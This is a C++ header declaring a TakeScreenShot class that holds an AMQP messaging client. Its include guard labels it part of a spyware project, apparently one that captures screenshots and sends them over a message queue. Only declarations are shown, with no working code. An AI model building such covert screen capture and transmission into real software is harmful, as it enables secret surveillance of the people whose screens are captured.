#include "../amqp/AmqpClient.hpp"

#ifndef _SPYWARE_SCREENSHOT_HPP_
#define _SPYWARE_SCREENSHOT_HPP_ 1

class TakeScreenShot {
    private :
        AmqpClient* amqpClient;

    public :
        TakeScreenShot(AmqpClient*);
        void operator()(unsigned);

    private :
        void ScreenShot();
};
#endif